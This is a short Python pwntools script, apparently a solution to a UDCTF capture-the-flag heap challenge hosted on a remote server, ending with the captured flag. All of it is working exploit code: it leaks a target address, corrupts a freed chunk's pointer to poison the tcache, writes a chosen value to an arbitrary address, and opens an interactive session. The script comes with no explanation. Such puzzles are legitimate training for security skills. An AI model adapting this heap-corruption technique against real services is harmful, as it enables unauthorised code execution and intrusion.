from pwn import *

p = remote("0.cloud.chals.io", 12549)

def gettarget():
    p.sendlineafter(b":\n", b"5")
    p.recvuntil(b": ")
    return int(p.recvline(), 16)

def make(index):
    p.sendlineafter(b":\n", b"1")
    p.sendlineafter(b"? ", str(index).encode())

def free(index):
    p.sendlineafter(b":\n", b"3")
    p.sendlineafter(b"? ", str(index).encode())

def edit(index, data):
    p.sendlineafter(b":\n", b"2")
    p.sendlineafter(b"? ", str(index).encode())
    p.sendlineafter(b"? ", data)

target = gettarget()

log.info(f"target: 0x{target:x}")

make(0)
make(1)
free(0)
free(1)
edit(1, p64(target))

make(2)
make(3)

edit(3, p64(0xdeadb007))

p.sendline(b"5")

p.interactive()

# UDCTF{b4by_c4n_craw1_awww}
